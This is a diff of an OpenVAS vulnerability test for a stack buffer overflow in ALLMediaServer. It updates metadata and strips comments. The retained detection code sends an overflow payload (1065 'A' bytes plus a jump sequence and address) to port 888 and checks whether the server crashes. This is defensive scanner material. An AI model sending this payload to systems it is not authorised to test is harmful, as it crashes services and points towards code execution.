@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_allmediaserver_stack_bof_vuln.nasl 6698 2017-07-12 12:00:17Z cfischer $
+# $Id: gb_allmediaserver_stack_bof_vuln.nasl 11096 2018-08-23 12:49:10Z mmartin $
 #
 # ALLMediaServer Request Handling Stack Buffer Overflow Vulnerability
 #
@@ -27,20 +27,17 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803745");
-  script_version("$Revision: 6698 $");
+  script_version("$Revision: 11096 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-23 14:49:10 +0200 (Thu, 23 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-08-22 10:39:02 +0530 (Thu, 22 Aug 2013)");
   script_name("ALLMediaServer Request Handling Stack Buffer Overflow Vulnerability");
 
   script_tag(name:"summary", value:"The host is running ALLMediaServer and is prone to stack based buffer overflow
   vulnerability.");
   script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and check the server crashed or not.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
   script_tag(name:"insight", value:"The flaw is due to a boundary error when processing certain network requests
   and can be exploited to cause a stack based buffer overflow via a specially
   crafted packet sent to TCP port 888.");
@@ -69,16 +66,8 @@ if(description)
 
 include("http_func.inc");
 
-## Variable Initialization
-soc = 0;
-port = 0;
-req = "";
-banner = "";
-
-## Get ALLMediaServer Port
 port = get_http_port(default:888);
 
-## Confirm ALLMediaServeris running
 if(http_is_dead(port:port)){
   exit(0);
 }
@@ -89,7 +78,6 @@ if(!soc) {
   exit(0);
 }
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if("Server: ALLPLAYER-DLNA" >!< banner)
 {
@@ -97,7 +85,6 @@ if("Server: ALLPLAYER-DLNA" >!< banner)
   exit(0);
 }
 
-## Construct and Send attack Request
 req = crap(data: "A", length: 1065) + "\xEB\x06\xFF\xFF" + "\x54\x08\x6f\x00";
 
 send(socket:soc, data:req);
@@ -105,7 +92,6 @@ http_close_socket(soc);
 
 sleep(3);
 
-## Confirm ALLMediaServer is dead
 if(http_is_dead(port:port))
 {
   security_message(port:port);
